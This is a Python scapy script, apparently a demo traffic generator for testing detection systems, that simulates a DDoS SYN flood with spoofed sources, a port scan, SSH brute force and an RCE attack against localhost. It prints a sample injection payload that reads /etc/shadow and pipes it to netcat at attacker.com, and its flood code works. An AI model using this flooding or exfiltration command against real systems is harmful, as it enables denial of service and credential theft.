from scapy.all import IP, TCP, UDP, ICMP, send, RandIP, RandShort
import time
import random
import os

class AttackSimulator:
    def __init__(self, target_ip="127.0.0.1"):
        self.target_ip = target_ip

    def _send_packet(self, pkt):
        try:
            send(pkt, verbose=False)
        except PermissionError:
            # Fallback for environments without raw socket access (like some sandboxes)
            # In a real defense system, this would be run with sudo
            pass

    def ddos_simulation(self, count=100):
        print(f"🔥 [DEMO] Initiating high-intensity DDoS attack on {self.target_ip}...")
        for i in range(count):
            pkt = IP(src=RandIP(), dst=self.target_ip) / TCP(sport=RandShort(), dport=80, flags="S")
            self._send_packet(pkt)
            if i % 10 == 0: print(f"   [>] Flooding... {i}/{count} packets dispatched")
        print("✅ DDoS simulation completed.")

    def port_scan_simulation(self):
        print(f"🔍 [DEMO] Initiating Stealth Port Scan on {self.target_ip}...")
        ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 3389, 8080]
        for port in ports:
            pkt = IP(dst=self.target_ip) / TCP(dport=port, flags="S")
            self._send_packet(pkt)
            print(f"   [*] Probing port {port}...")
            time.sleep(0.05)
        print("✅ Port scan simulation completed.")

    def brute_force_simulation(self):
        print(f"🔨 [DEMO] Initiating SSH Brute Force against {self.target_ip}...")
        for i in range(20):
            pkt = IP(dst=self.target_ip) / TCP(dport=22, flags="PA")
            self._send_packet(pkt)
            if i % 5 == 0: print(f"   [*] Attempting credential set #{i//5 + 1}...")
            time.sleep(0.1)
        print("✅ Brute force simulation completed.")

    def rce_exploit_simulation(self):
        print(f"💀 [DEMO] Executing Remote Code Execution (RCE) Exploit on {self.target_ip}...")
        print("   [*] Payload: ; cat /etc/shadow | nc attacker.com 4444")
        for i in range(15):
            # Signature: High payload size, specific flags
            pkt = IP(dst=self.target_ip) / TCP(sport=RandShort(), dport=80, flags="PA") / ("X" * 1200)
            self._send_packet(pkt)
            if i % 5 == 0: print(f"   [!] Exfiltrating data chunk {i//5 + 1}...")
            time.sleep(0.1)
        print("✅ RCE exploit simulation completed.")

if __name__ == "__main__":
    # Use loopback for testing
    sim = AttackSimulator("127.0.0.1")
    sim.brute_force_simulation()
